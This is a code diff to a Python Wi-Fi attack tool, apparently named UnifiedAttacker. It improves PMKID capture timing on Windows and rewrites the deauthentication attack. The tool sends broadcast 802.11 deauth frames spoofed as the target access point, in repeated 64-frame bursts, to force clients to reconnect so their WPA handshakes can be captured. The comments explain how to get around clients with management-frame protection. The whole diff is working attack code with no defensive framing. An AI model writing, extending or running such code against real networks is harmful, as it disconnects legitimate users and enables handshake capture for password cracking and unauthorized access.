@@ -484,7 +484,10 @@ class UnifiedAttacker:
 
             t = threading.Thread(target=_win_cap, daemon=True)
             t.start()
-            done.wait(timeout=self.CAPTURE_SECS)
+            # Extra 15s beyond CAPTURE_SECS so the background thread has time
+            # to finish wrpcap() after sniff() returns — avoids a race where we
+            # check cap_path.exists() before the file has been written.
+            done.wait(timeout=self.CAPTURE_SECS + 15)
         else:
             if not check_tool("hcxdumptool"):
                 self._log("hcxdumptool not found -- skipping PMKID", "warn")
@@ -709,27 +712,26 @@ class UnifiedAttacker:
         cap_thread = threading.Thread(target=_do_cap, daemon=True)
         cap_thread.start()
 
-        # Wait briefly then send deauth to accelerate handshake
-        time.sleep(5)
-        if not self._stop.is_set():
-            self._log("Sending Scapy deauth frames to force client reconnection...", "info")
+        # Resolve the Npcap interface object once for all deauth rounds.
+        # sendp() on Windows requires a NetworkInterface object, not the raw
+        # NPF path string.
+        import scapy.all as sc
+        iface_for_send = self._scapy_iface
+        try:
+            for _iface_obj in sc.conf.ifaces.values():
+                _pcap = (
+                    getattr(_iface_obj, "pcap_name", "")
+                    or getattr(_iface_obj, "network_name", "")
+                )
+                if _pcap and _pcap.lower() == self._scapy_iface.lower():
+                    iface_for_send = _iface_obj
+                    break
+        except Exception:
+            pass
+
+        def _send_deauth() -> None:
+            """Send a broadcast deauth burst (spoofed as the AP)."""
             try:
-                import scapy.all as sc
-                # On Windows, sendp() requires a NetworkInterface object rather than
-                # a raw NPF path string (\Device\NPF_{GUID}).  Resolve it from
-                # conf.ifaces; fall back to the string if not found.
-                iface_for_send = self._scapy_iface
-                try:
-                    for _iface_obj in sc.conf.ifaces.values():
-                        _pcap = (
-                            getattr(_iface_obj, "pcap_name", "")
-                            or getattr(_iface_obj, "network_name", "")
-                        )
-                        if _pcap and _pcap.lower() == self._scapy_iface.lower():
-                            iface_for_send = _iface_obj
-                            break
-                except Exception:
-                    pass
                 dot11 = sc.Dot11(
                     type=0, subtype=12,
                     addr1="ff:ff:ff:ff:ff:ff",
@@ -737,13 +739,26 @@ class UnifiedAttacker:
                     addr3=self.target.bssid,
                 )
                 frame = sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7)
-                sc.sendp(frame, iface=iface_for_send, count=10, inter=0.1, verbose=False)
-                self._log("Deauth frames sent", "info")
+                sc.sendp(frame, iface=iface_for_send, count=64, inter=0.05, verbose=False)
+                self._log("Deauth burst sent (64 frames)", "info")
             except Exception as exc:
                 self._log(f"Deauth failed (non-fatal): {exc}", "warn")
 
+        # Send deauth at 5 s, 20 s, 35 s, 50 s into the 60 s capture window.
+        # Multiple rounds are needed because:
+        #  - some clients reconnect quickly and the EAPOL happens between rounds
+        #  - 802.11w (MFP) clients ignore broadcast deauth; a retry may catch
+        #    a non-MFP client that joined later
+        _deauth_delays = [5, 15, 15, 15]   # seconds between rounds (total ≤ 50s)
+        for delay in _deauth_delays:
+            time.sleep(delay)
+            if self._stop.is_set() or not cap_thread.is_alive():
+                break
+            self._log("Sending deauth burst to force client reconnection...", "info")
+            _send_deauth()
+
         # Wait for capture to finish (or stop signal)
-        cap_thread.join(timeout=self.CAPTURE_SECS + 10)
+        cap_thread.join(timeout=15)
 
         if self._stop.is_set():
             return None
